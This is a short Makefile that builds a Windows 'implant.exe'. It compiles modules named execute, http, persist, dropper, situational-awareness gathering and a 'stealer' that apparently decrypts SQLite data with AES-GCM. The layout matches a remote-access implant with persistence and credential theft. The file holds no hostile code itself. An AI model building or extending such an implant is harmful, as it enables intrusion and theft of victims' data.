MAC = x86_64-w64-mingw32-g++ 
CXX = g++
LIBRARIES = -lWinHttp -lcrypt32 -luserenv -lbcrypt -lshlwapi -lUrlmon -static

FILES = execute/execute.cpp file/file.cpp http/http.cpp persist/persist.cpp
FILES2 = situational_awareness/GatherInfo.cpp dropper/Dropper.cpp
FILES3 = stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp

apple: $(eval SHELL:=/bin/zsh)
	$(MAC) implant.cpp $(FILES) $(FILES2) $(LIBRARIES) -o implant.exe

windows: implant.cpp
	$(CXX) implant.cpp $(FILES) $(FILES2) $(FILES3) $(LIBRARIES) -o implant.exe



